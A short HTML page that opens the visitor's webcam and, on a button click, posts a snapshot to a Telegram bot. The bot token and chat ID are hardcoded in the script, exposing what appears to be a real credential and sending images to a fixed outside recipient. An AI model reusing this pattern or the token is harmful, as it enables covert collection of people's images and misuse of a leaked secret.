<!DOCTYPE html>
<html>
<head>
  <title>Send Live Camera Feed</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <script>
    function sendLiveFeed() {
      var video = document.getElementById('liveFeed');
      var canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      var context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      var imageDataURL = canvas.toDataURL('image/jpeg');

      var botToken = '6909931054:AAHTR39e4V2mSlud5s7uHHIu6cjRckP1DrQ';
      var chatId = '1171970672';

      var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
      var params = {
        chat_id: chatId,
        photo: imageDataURL,
        caption: 'Live Camera Feed'
      };

      var xhr = new XMLHttpRequest();
      xhr.open('POST', url, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify(params));
    }
  </script>
  <div class="camera-box">
    <video id="liveFeed" autoplay></video>
    <button onclick="sendLiveFeed()">Send Live Feed</button>
  </div>

  <script>
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        var video = document.getElementById('liveFeed');
        video.srcObject = stream;
      })
      .catch(function(err) {
        console.log('Error accessing camera:', err);
      });
  </script>
</body>
</html>
